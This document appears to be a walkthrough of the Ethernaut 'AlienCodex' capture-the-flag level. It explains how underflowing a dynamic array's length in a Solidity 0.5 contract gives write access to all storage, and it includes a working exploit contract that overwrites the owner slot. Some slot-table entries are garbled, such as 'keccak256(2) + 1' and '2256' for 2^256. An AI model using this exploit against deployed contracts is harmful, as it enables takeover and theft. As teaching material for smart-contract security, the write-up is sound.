![](https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg)

You've uncovered an Alien contract. Claim ownership to complete the level.

  Things that might help

- Understanding how array storage works
- Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
- Using a very `underhanded` approach

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

Solution:
Assuming the dynamic array starts at a slot location `p`, then the slot `p` will contain the total number of elements stored in the array, and the actual array data will be stored at `keccack256(p)`. More info on this can be found in the [Solidity Docs](https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html#mappings-and-dynamic-arrays).

Let's go through the organization of the storage layout in our vulnerable contract:

|Slot Number|Variables|
|---|---|
|0|`bool public contact` and `address private _owner` (both are in slot 0)|
|1|codex.length (Number of elements in the dynamic array|
|..|..|
|..|..|
|keccak256(1)|codex[0] (Array's first element)|
|keccak256(2) + 1|codex[1] (Array's second element)|
|..|..|
|..|..|
|2256 - 1|codex[$2^{256}$ - 1 - unit(keccack256(1))]|
|0| codex[$2^{256}$ - 1 - unit(keccack256(1)) + 1] (slot 0 access, remember overflows?)|

To finish the level we need to do the following steps:

1. Call the `make_contact()` function so that the `contact` is set to `true`. This will allow us to go through the `contacted()` modifier.
2. Call the `retract()` function. This will decrease the `codex.length` by 1. And what happens when you subtract 1 from 0 (initial array position)? You get an underflow. This will change the `codex.length` to be 2256 which is also the total storage capacity of the contract. This will now allow us access to any variables stored in the contract.
3. Call the `revise()` function to access the array at slot 0 and update the value of the `_owner` with our own address. The index `i` can be calculated as shown in the slot table above.

```sol
uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
```

The `_content` is of type `bytes32` which means we need to convert our address to `bytes32`. This can be done using the following code:

```sol
bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
```

---

## The Exploit

Here's how the exploit code looks:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
  function makeContact() external;
  function record(bytes32 _content) external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
}

contract PWN {
    IAlienCodex instance;
    constructor(address _instance) {
      instance = IAlienCodex(_instance);
    }

    function pwn() external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        instance.makeContact();
        instance.retract();
        instance.revise(index, myAddress);
    }
}
```

___
This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of `2^256`. The user is then able to modify all contract storage.

Both vulnerabilities are inspired by 2017's [Underhanded coding contest](https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)
